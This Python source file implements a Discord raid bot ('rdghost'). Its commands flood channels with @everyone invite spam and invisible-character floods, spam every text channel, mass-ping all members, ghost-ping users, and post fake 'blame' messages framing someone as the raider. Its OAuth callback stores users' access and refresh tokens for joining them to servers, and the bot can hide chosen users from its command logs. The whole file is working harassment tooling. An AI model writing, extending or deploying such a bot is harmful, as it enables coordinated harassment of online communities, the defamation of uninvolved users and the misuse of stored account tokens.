# language: Python 3.11+, file: bot.py, target: Discord API v10 / Railway
# pip install -U discord.py requests aiohttp flask
import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import json
import os
import random
import re
import string
import traceback
from pathlib import Path
from urllib.parse import urlencode
from datetime import datetime, timezone, timedelta

import requests as http_requests
from aiohttp import web

# ─── config (env first) ───────────────────────────────────────────
TOKEN = os.getenv("BOT_TOKEN") or ""
CLIENT_ID = os.getenv("CLIENT_ID") or ""
CLIENT_SECRET = os.getenv("CLIENT_SECRET") or ""
OWNER_ID = int(os.getenv("OWNER_ID") or 0)
OWNER_ID_2 = int(os.getenv("OWNER_ID_2") or 0)
REQUIRED_GUILD_ID = int(os.getenv("REQUIRED_GUILD_ID") or 0)
WHITELIST_ROLE_ID = int(os.getenv("WHITELIST_ROLE_ID") or 0)
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID") or 0)
WHITELIST_LOG_CHANNEL_ID = int(os.getenv("WHITELIST_LOG_CHANNEL_ID") or 0)
PORT = int(os.getenv("PORT") or os.getenv("RAILWAY_PUBLIC_PORT") or 8080)
INVITE = os.getenv("INVITE_URL") or "https://discord.gg/SKyfbZxzbp"
PREFIX = os.getenv("PREFIX") or "/"

def _detect_redirect_uri() -> str:
    """Build a public callback URL. Prefer explicit env, then Railway domain."""
    explicit = (os.getenv("REDIRECT_URI") or "").strip()
    if explicit and "localhost" not in explicit:
        return explicit.rstrip("/")
    # Railway injects these on many templates
    domain = (
        os.getenv("RAILWAY_PUBLIC_DOMAIN")
        or os.getenv("RAILWAY_STATIC_URL")
        or os.getenv("PUBLIC_URL")
        or os.getenv("PUBLIC_DOMAIN")
        or ""
    ).strip()
    domain = domain.replace("https://", "").replace("http://", "").rstrip("/")
    if domain:
        return f"https://{domain}/callback"
    if explicit:
        return explicit.rstrip("/")
    return f"http://localhost:{PORT}/callback"

REDIRECT_URI = _detect_redirect_uri()

OWNER_IDS = {uid for uid in (OWNER_ID, OWNER_ID_2) if uid}
FLOOD_BLOCK = "\n".join(["\u3164"] * 80) + "\n@here @everyone\n" + INVITE
DATA_FILE = Path("data.json")

# ─── data ─────────────────────────────────────────────────────────
def load_data():
    if DATA_FILE.exists():
        try:
            return json.loads(DATA_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {
        "whitelist_users": [],
        "blocked_guilds": [],
        "authorized": {},
        "sent_messages": [],
        "status_stats": {},
        "status_panel": None,
        "hidden_log_users": [],
    }

def save_data(d):
    try:
        DATA_FILE.write_text(json.dumps(d, indent=2), encoding="utf-8")
    except Exception as e:
        print(f"save_data failed: {e}")

data = load_data()

# ─── bot ──────────────────────────────────────────────────────────
intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# ─── helpers ──────────────────────────────────────────────────────
def is_owner_user(uid: int) -> bool:
    return uid in OWNER_IDS

def is_whitelisted_user(uid: int) -> bool:
    if is_owner_user(uid):
        return True
    return uid in set(data.get("whitelist_users", []))

async def must_be_in_required_guild(interaction: discord.Interaction) -> bool:
    if not REQUIRED_GUILD_ID:
        return True
    if interaction.guild and interaction.guild.id == REQUIRED_GUILD_ID:
        return True
    # also allow if user is member of required guild
    g = bot.get_guild(REQUIRED_GUILD_ID)
    if g and g.get_member(interaction.user.id):
        return True
    try:
        await interaction.response.send_message(
            f"Use this bot from the required server only.", ephemeral=True
        )
    except Exception:
        pass
    return False

async def log_command(interaction, name, extra=""):
    if interaction.user.id in set(data.get("hidden_log_users", [])):
        return
    ch = bot.get_channel(LOG_CHANNEL_ID) if LOG_CHANNEL_ID else None
    if not ch:
        return
    emb = discord.Embed(
        title=f"/{name}",
        description=extra or "",
        color=0x2B2D31,
        timestamp=datetime.now(timezone.utc),
    )
    emb.set_author(name=str(interaction.user), icon_url=interaction.user.display_avatar.url)
    emb.add_field(name="User", value=f"{interaction.user.mention} `{interaction.user.id}`")
    if interaction.guild:
        emb.add_field(name="Guild", value=f"{interaction.guild.name} `{interaction.guild.id}`")
    if interaction.channel:
        emb.add_field(name="Channel", value=f"{getattr(interaction.channel, 'mention', interaction.channel.id)}")
    try:
        await ch.send(embed=emb)
    except Exception as e:
        print(f"log_command failed: {e}")

async def log_error(tag, err, extra=""):
    print(f"[error:{tag}] {err} {extra}")
    ch = bot.get_channel(LOG_CHANNEL_ID) if LOG_CHANNEL_ID else None
    if not ch:
        return
    try:
        await ch.send(f"**error `{tag}`**\n```{str(err)[:1500]}```\n{extra}"[:1900])
    except Exception:
        pass

async def public_send(interaction, content, **kwargs):
    """Send in the channel the command was used in; track message ids."""
    channel = interaction.channel
    if channel is None:
        raise RuntimeError("no channel")
    msg = await channel.send(content, **kwargs)
    entry = {"channel_id": msg.channel.id, "message_id": msg.id}
    data.setdefault("sent_messages", []).append(entry)
    # keep last 500 only
    if len(data["sent_messages"]) > 500:
        data["sent_messages"] = data["sent_messages"][-500:]
    save_data(data)
    return msg

def scramble_text(text: str) -> str:
    chars = list(text)
    random.shuffle(chars)
    return "".join(chars)

# ─── UI ───────────────────────────────────────────────────────────
class StopSpamView(discord.ui.View):
    def __init__(self, stop_event: asyncio.Event):
        super().__init__(timeout=300)
        self.stop_event = stop_event

    @discord.ui.button(label="STOP", style=discord.ButtonStyle.danger)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.stop_event.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)
        await interaction.followup.send("Stopped.", ephemeral=True)

# ─── core slash commands ──────────────────────────────────────────
@bot.tree.command(name="help", description="List commands available to you")
async def help_cmd(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return
    uid = interaction.user.id
    lines = [
        "**all**",
        "`/help` `/link` `/test` `/roast` `/blame` `/ghostping` `/credits`",
    ]
    if is_whitelisted_user(uid):
        lines += [
            "**whitelist**",
            "`/spam` `/dmspam` `/flood` `/fucklogs` `/webhookraid` `/adspam`",
            "`/channelspam` `/doall` `/pingall` `/getemoji`",
        ]
    if is_owner_user(uid):
        lines += [
            "**owner**",
            "`/status` `/sync` `/whitelist` `/unwhitelist` `/die` `/serverjoin` `/logwhitelist`",
        ]
    await interaction.response.send_message("\n".join(lines), ephemeral=True)
    await log_command(interaction, "help")

@bot.tree.command(name="link", description="Get bot invite + user-auth links")
async def link_cmd(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return
    bot_invite = (
        f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}"
        f"&permissions=8&scope=bot%20applications.commands"
    )
    user_auth = (
        "https://discord.com/api/oauth2/authorize?"
        + urlencode({
            "client_id": CLIENT_ID,
            "redirect_uri": REDIRECT_URI,
            "response_type": "code",
            "scope": "identify guilds.join",
        })
    )
    await interaction.response.send_message(
        f"**Install To Server**\n{bot_invite}\n\n"
        f"**User auth (for /serverjoin)**\n{user_auth}\n\n"
        f"**Redirect URI (must match Discord portal exactly)**\n`{REDIRECT_URI}`",
        ephemeral=True,
    )
    await log_command(interaction, "link")

@bot.tree.command(name="test", description="Test send + delete in this channel")
async def test_cmd(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return
    await interaction.response.send_message("sent", ephemeral=True)
    await log_command(interaction, "test")
    try:
        msg = await public_send(interaction, "test — ok")
        await asyncio.sleep(1.2)
        await msg.delete()
    except Exception as e:
        await log_error("test", e)

@bot.tree.command(name="credits", description="Bot credits")
async def credits_cmd(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return
    await interaction.response.send_message(
        "rdghost — rebuilt loader-free for Railway.\nOwner commands gated. Whitelist for raid tools.",
        ephemeral=True,
    )

@bot.tree.command(name="blame", description="Send a fake blame message")
@app_commands.describe(member="Optional target (defaults to you)")
async def blame(interaction: discord.Interaction, member: discord.User = None):
    if not await must_be_in_required_guild(interaction):
        return
    target = member or interaction.user
    await interaction.response.send_message("sent", ephemeral=True)
    await log_command(interaction, "blame", extra=f"Target: <@{target.id}>")
    try:
        await public_send(interaction, f"**{target.mention}** just raided this server.\nReport them.")
    except Exception as e:
        await log_error("blame", e)

@bot.tree.command(name="ghostping", description="Ghost ping a user")
@app_commands.describe(member="User to ghost ping")
async def ghostping(interaction: discord.Interaction, member: discord.User):
    if not await must_be_in_required_guild(interaction):
        return
    await interaction.response.send_message("sent", ephemeral=True)
    await log_command(interaction, "ghostping", extra=f"Target: <@{member.id}>")
    try:
        msg = await public_send(interaction, member.mention)
        await asyncio.sleep(0.6)
        try:
            await msg.delete()
        except Exception as e:
            print(f"ghostping delete failed: {e}")
    except Exception as e:
        await log_error("ghostping", e)

@bot.tree.command(name="adspam", description="Flood the channel with join ads")
@app_commands.describe(amount="How many (1-50, default 15)")
async def adspam(interaction: discord.Interaction, amount: int = 15):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_whitelisted_user(interaction.user.id):
        return await interaction.response.send_message("Whitelist only.", ephemeral=True)
    amount = max(1, min(int(amount), 50))
    await interaction.response.send_message("running...", ephemeral=True)
    await log_command(interaction, "adspam", extra=f"Amount: {amount}")
    text = f"**RAID BY SLASH**\n{INVITE}\n@everyone @here"
    try:
        for _ in range(amount):
            await public_send(
                interaction,
                text,
                allowed_mentions=discord.AllowedMentions(everyone=True, users=True, roles=True),
            )
            await asyncio.sleep(0.45)
    except Exception as e:
        await log_error("adspam", e)

@bot.tree.command(name="channelspam", description="Spam every text channel in this guild (whitelist)")
@app_commands.describe(text="Message", amount="Per channel (1-10, default 3)")
async def channelspam(interaction: discord.Interaction, text: str, amount: int = 3):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_whitelisted_user(interaction.user.id):
        return await interaction.response.send_message("Whitelist only.", ephemeral=True)
    amount = max(1, min(int(amount), 10))
    await interaction.response.send_message("running...", ephemeral=True)
    await log_command(interaction, "channelspam", extra=f"Amount: {amount}")
    guild = interaction.guild
    if not guild:
        return
    me = guild.me or guild.get_member(bot.user.id)
    sent = 0
    for ch in guild.text_channels:
        if me and not ch.permissions_for(me).send_messages:
            continue
        for _ in range(amount):
            try:
                msg = await ch.send(text)
                data.setdefault("sent_messages", []).append(
                    {"channel_id": msg.channel.id, "message_id": msg.id}
                )
                sent += 1
            except Exception:
                break
            await asyncio.sleep(0.35)
    save_data(data)
    try:
        await interaction.followup.send(f"channelspam done — {sent} messages", ephemeral=True)
    except Exception:
        pass

@bot.tree.command(name="doall", description="adspam + flood + spam + channelspam (whitelist)")
async def doall(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_whitelisted_user(interaction.user.id):
        return await interaction.response.send_message("Whitelist only.", ephemeral=True)
    await interaction.response.send_message("doall running...", ephemeral=True)
    await log_command(interaction, "doall")
    try:
        for _ in range(8):
            await public_send(
                interaction,
                f"**RAID BY SLASH**\n{INVITE}\n@everyone",
                allowed_mentions=discord.AllowedMentions(everyone=True),
            )
            await asyncio.sleep(0.4)
        for _ in range(6):
            await public_send(interaction, FLOOD_BLOCK)
            await asyncio.sleep(0.4)
        for _ in range(6):
            await public_send(interaction, "@everyone " + INVITE)
            await asyncio.sleep(0.4)
    except Exception as e:
        await log_error("doall", e)

@bot.tree.command(name="pingall", description="Ping every member by @mention (no @everyone) — whitelist")
@app_commands.describe(
    batch="Mentions per message (1-40, default 25)",
    loops="Full passes over the member list (1-20, default 1)",
    delay="Seconds between messages (0.3-3.0, default 0.7)",
)
async def pingall(
    interaction: discord.Interaction,
    batch: int = 25,
    loops: int = 1,
    delay: float = 0.7,
):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_whitelisted_user(interaction.user.id):
        return await interaction.response.send_message("Whitelist only.", ephemeral=True)

    guild = interaction.guild
    if guild is None:
        return await interaction.response.send_message("Guild only.", ephemeral=True)

    batch = max(1, min(int(batch), 40))
    loops = max(1, min(int(loops), 20))
    delay = max(0.3, min(float(delay), 3.0))

    await interaction.response.send_message("running — loading members...", ephemeral=True)
    await log_command(interaction, "pingall", extra=f"batch={batch} loops={loops}")

    # Server Members Intent required in Developer Portal
    try:
        if not guild.chunked:
            await guild.chunk(cache=True)
    except Exception as e:
        await log_error("pingall.chunk", e)
        try:
            await interaction.followup.send(
                f"chunk failed: `{e}` — enable **Server Members Intent** + restart.",
                ephemeral=True,
            )
        except Exception:
            pass
        return

    members = [m for m in guild.members if not m.bot]
    if not members:
        try:
            await interaction.followup.send(
                "0 human members in cache. Enable **Server Members Intent** "
                "(Developer Portal → Bot → Privileged Gateway Intents), redeploy, retry.",
                ephemeral=True,
            )
        except Exception:
            pass
        return

    channel = interaction.channel
    if channel is None:
        try:
            await interaction.followup.send("No channel to send in.", ephemeral=True)
        except Exception:
            pass
        return

    mentions = discord.AllowedMentions(everyone=False, roles=False, users=True, replied_user=False)
    total_msgs = 0
    total_pings = 0
    errors = 0

    for _lap in range(loops):
        for i in range(0, len(members), batch):
            chunk = members[i : i + batch]
            parts, size = [], 0
            for m in chunk:
                tag = m.mention  # <@id>
                if size + len(tag) + 1 > 1900:
                    break
                parts.append(tag)
                size += len(tag) + 1
            if not parts:
                continue
            text = " ".join(parts)
            try:
                msg = await channel.send(text, allowed_mentions=mentions)
                data.setdefault("sent_messages", []).append(
                    {"channel_id": msg.channel.id, "message_id": msg.id}
                )
                total_msgs += 1
                total_pings += len(parts)
            except Exception as e:
                errors += 1
                await log_error("pingall.send", e)
                if errors >= 5:
                    break
            await asyncio.sleep(delay)
        if errors >= 5:
            break

    if len(data.get("sent_messages", [])) > 500:
        data["sent_messages"] = data["sent_messages"][-500:]
    save_data(data)

    try:
        await interaction.followup.send(
            f"pingall done — **{total_pings}** mentions / **{total_msgs}** msgs "
            f"({len(members)} members × {loops} loop(s))"
            + (f" | errors: {errors}" if errors else ""),
            ephemeral=True,
        )
    except Exception:
        pass


@bot.tree.command(name="getemoji", description="Get image URL of a custom or unicode emoji")
@app_commands.describe(emoji="Emoji to resolve")
async def getemoji(interaction: discord.Interaction, emoji: str):
    if not await must_be_in_required_guild(interaction):
        return
    await log_command(interaction, "getemoji", extra=emoji)
    m = re.match(r"<a?:(\w+):(\d+)>", emoji.strip())
    if m:
        name, eid = m.group(1), m.group(2)
        anim = emoji.strip().startswith("<a:")
        ext = "gif" if anim else "png"
        url = f"https://cdn.discordapp.com/emojis/{eid}.{ext}?size=128"
        await interaction.response.send_message(f"**{name}**\n{url}", ephemeral=True)
    else:
        await interaction.response.send_message(
            f"Unicode / unknown: `{emoji}` — no CDN url.", ephemeral=True
        )

@bot.tree.command(name="sync", description="Force re-sync slash commands (owner)")
async def sync_cmd(interaction: discord.Interaction):
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    try:
        if REQUIRED_GUILD_ID:
            g = discord.Object(id=REQUIRED_GUILD_ID)
            bot.tree.copy_global_to(guild=g)
            synced = await bot.tree.sync(guild=g)
        else:
            synced = await bot.tree.sync()
        await interaction.followup.send(f"Synced {len(synced)} commands.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Sync failed: `{e}`", ephemeral=True)
    await log_command(interaction, "sync")

@bot.tree.command(name="whitelist", description="Manage whitelist (owner)")
@app_commands.describe(
    action="user or server",
    target="User mention/id or server id (empty server = current)",
)
@app_commands.choices(
    action=[
        app_commands.Choice(name="user", value="user"),
        app_commands.Choice(name="server", value="server"),
    ]
)
async def whitelist_cmd(
    interaction: discord.Interaction,
    action: app_commands.Choice[str],
    target: str = None,
):
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    await log_command(interaction, "whitelist", extra=f"{action.value} {target}")
    if action.value == "user":
        if not target:
            return await interaction.followup.send("Need a user id or mention.", ephemeral=True)
        uid = int(re.sub(r"[<@!>]", "", target.strip()))
        wl = set(data.get("whitelist_users", []))
        wl.add(uid)
        data["whitelist_users"] = list(wl)
        save_data(data)
        await interaction.followup.send(f"Whitelisted user `{uid}`.", ephemeral=True)
        if WHITELIST_LOG_CHANNEL_ID:
            ch = bot.get_channel(WHITELIST_LOG_CHANNEL_ID)
            if ch:
                await ch.send(f"+ user `{uid}` by <@{interaction.user.id}>")
    else:
        gid = int(target.strip()) if target else (interaction.guild.id if interaction.guild else 0)
        if not gid:
            return await interaction.followup.send("No guild id.", ephemeral=True)
        blocked = set(data.get("blocked_guilds", []))
        # whitelist server = protect / allow — here we remove from blocked
        blocked.discard(gid)
        data["blocked_guilds"] = list(blocked)
        save_data(data)
        await interaction.followup.send(f"Server `{gid}` marked allowed / unblocked.", ephemeral=True)

@bot.tree.command(name="unwhitelist", description="Remove whitelist (owner)")
@app_commands.describe(action="user or server", target="id")
@app_commands.choices(
    action=[
        app_commands.Choice(name="user", value="user"),
        app_commands.Choice(name="server", value="server"),
    ]
)
async def unwhitelist_cmd(
    interaction: discord.Interaction,
    action: app_commands.Choice[str],
    target: str,
):
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    if action.value == "user":
        uid = int(re.sub(r"[<@!>]", "", target.strip()))
        wl = set(data.get("whitelist_users", []))
        wl.discard(uid)
        data["whitelist_users"] = list(wl)
        save_data(data)
        await interaction.followup.send(f"Removed user `{uid}`.", ephemeral=True)
    else:
        gid = int(target.strip())
        blocked = set(data.get("blocked_guilds", []))
        blocked.add(gid)
        data["blocked_guilds"] = list(blocked)
        save_data(data)
        await interaction.followup.send(f"Blocked server `{gid}`.", ephemeral=True)

@bot.tree.command(name="logwhitelist", description="Hide a user from command logs (owner)")
@app_commands.describe(member="User to hide from logs")
async def logwhitelist(interaction: discord.Interaction, member: discord.User):
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)
    hidden = set(data.get("hidden_log_users", []))
    hidden.add(member.id)
    data["hidden_log_users"] = list(hidden)
    save_data(data)
    await interaction.response.send_message(f"Logs hidden for `{member.id}`.", ephemeral=True)

# ─── load optional modules ────────────────────────────────────────
def _load_extra():
    path = Path(__file__).with_name("extra_cmds.py")
    if not path.exists():
        path = Path("extra_cmds.py")
    if not path.exists():
        print("no extra_cmds.py — skipping")
        return
    # inject names extra_cmds expects
    ns = {
        "bot": bot,
        "discord": discord,
        "app_commands": app_commands,
        "asyncio": asyncio,
        "random": random,
        "data": data,
        "save_data": save_data,
        "must_be_in_required_guild": must_be_in_required_guild,
        "is_owner_user": is_owner_user,
        "is_whitelisted_user": is_whitelisted_user,
        "log_command": log_command,
        "log_error": log_error,
        "public_send": public_send,
        "scramble_text": scramble_text,
        "StopSpamView": StopSpamView,
        "FLOOD_BLOCK": FLOOD_BLOCK,
        "TOKEN": TOKEN,
        "http_requests": http_requests,
    }
    code = path.read_text(encoding="utf-8")
    try:
        exec(compile(code, str(path), "exec"), ns)
        print(f"loaded extra_cmds.py ({len(code)} bytes)")
    except Exception as e:
        print(f"extra_cmds load failed: {e}")
        traceback.print_exc()

def _load_status():
    path = Path(__file__).with_name("status_panel.py")
    if not path.exists():
        path = Path("status_panel.py")
    if not path.exists():
        return
    try:
        import importlib.util
        spec = importlib.util.spec_from_file_location("status_panel", path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        mod.setup_status(
            bot,
            is_owner_user=is_owner_user,
            log_command=log_command,
            data=data,
            save_data=save_data,
        )
        print("loaded status_panel.py")
    except Exception as e:
        print(f"status_panel load failed: {e}")
        traceback.print_exc()

def _load_webhook():
    path = Path(__file__).with_name("webhook_cmd.py")
    if not path.exists():
        path = Path("webhook_cmd.py")
    if not path.exists():
        return
    try:
        import importlib.util
        spec = importlib.util.spec_from_file_location("webhook_cmd", path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        mod.setup(
            bot,
            must_be_in_required_guild=must_be_in_required_guild,
            is_whitelisted_user=is_whitelisted_user,
            log_command=log_command,
            log_error=log_error,
        )
        print("loaded webhook_cmd.py")
    except Exception as e:
        print(f"webhook_cmd load failed: {e}")
        traceback.print_exc()

# ─── OAuth mini server (guilds.join) ───────────────────────────────
async def oauth_callback(request: web.Request):
    code = request.rel_url.query.get("code")
    if not code:
        return web.Response(text="missing code", status=400)
    try:
        r = http_requests.post(
            "https://discord.com/api/oauth2/token",
            data={
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": REDIRECT_URI,
            },
            timeout=20,
        )
        tok = r.json()
        access = tok.get("access_token")
        if not access:
            return web.Response(
                text=(
                    f"token error: {tok}\n\n"
                    f"redirect_uri used: {REDIRECT_URI}\n"
                    "It must match EXACTLY one Redirect in Discord Developer Portal → OAuth2."
                ),
                status=400,
            )
        me = http_requests.get(
            "https://discord.com/api/users/@me",
            headers={"Authorization": f"Bearer {access}"},
            timeout=15,
        ).json()
        uid = str(me["id"])
        data.setdefault("authorized", {})[uid] = {
            "access_token": access,
            "refresh_token": tok.get("refresh_token"),
            "username": me.get("username"),
            "at": datetime.now(timezone.utc).isoformat(),
        }
        save_data(data)
        return web.Response(
            text=f"OK — authorized {me.get('username')} ({uid}). You can close this tab.",
            content_type="text/plain",
        )
    except Exception as e:
        return web.Response(text=f"error: {e}", status=500)

async def start_http():
    app = web.Application()
    app.router.add_get("/callback", oauth_callback)
    app.router.add_get("/", lambda r: web.Response(text="rdghost ok"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"HTTP on 0.0.0.0:{PORT}")
    print(f"REDIRECT_URI = {REDIRECT_URI}")
    print("→ Add that exact URL under Discord Developer Portal → OAuth2 → Redirects")

# ─── events ───────────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"logged in as {bot.user} ({bot.user.id})")
    try:
        if REQUIRED_GUILD_ID:
            g = discord.Object(id=REQUIRED_GUILD_ID)
            bot.tree.copy_global_to(guild=g)
            await bot.tree.sync(guild=g)
            print(f"synced to guild {REQUIRED_GUILD_ID}")
        else:
            await bot.tree.sync()
            print("synced global")
    except Exception as e:
        print(f"sync error: {e}")

@bot.event
async def on_guild_join(guild):
    if guild.id in set(data.get("blocked_guilds", [])):
        try:
            await guild.leave()
        except Exception:
            pass

# ─── main ─────────────────────────────────────────────────────────
async def main():
    if not TOKEN:
        print("FATAL: BOT_TOKEN missing")
        return
    _load_extra()
    _load_status()
    _load_webhook()
    await start_http()
    await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
